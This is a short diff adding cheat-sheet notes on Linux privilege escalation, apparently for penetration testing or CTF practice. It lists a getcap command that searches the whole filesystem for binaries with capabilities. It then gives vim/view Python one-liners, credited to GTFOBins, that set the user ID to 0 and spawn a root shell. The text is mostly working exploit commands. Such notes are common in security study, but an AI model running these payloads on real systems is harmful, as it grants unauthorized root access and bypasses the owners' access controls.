@@ -1,0 +1,8 @@
+# Another method system administrators can use to increase the privilege level of a process or binary is "capabilities". capabilities help manage privileges at a more granular level.
+
+# the following command will recursively list all the capabilities of a file
+getcap -r / 2>/dev/null 
+
+# After opening the vim/view, look in GTFOBins for capabilities
+py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
+py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
